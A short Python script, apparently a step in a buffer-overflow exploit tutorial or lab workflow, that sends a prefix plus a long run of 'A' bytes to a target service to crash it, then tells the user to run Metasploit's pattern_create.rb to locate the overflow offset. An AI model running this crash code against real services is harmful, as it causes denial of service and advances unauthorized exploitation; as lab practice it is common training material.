#!/usr/bin/python3
import socket
from details import *

s = socket.socket()
s.connect((HOST,PORT))
initial(s)
s.send(PREFIX + b"A"*TOTAL_LENGTH)
s.close()
print(f"Did it crash like you think it should? Great. Now run /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l {TOTAL_LENGTH}")
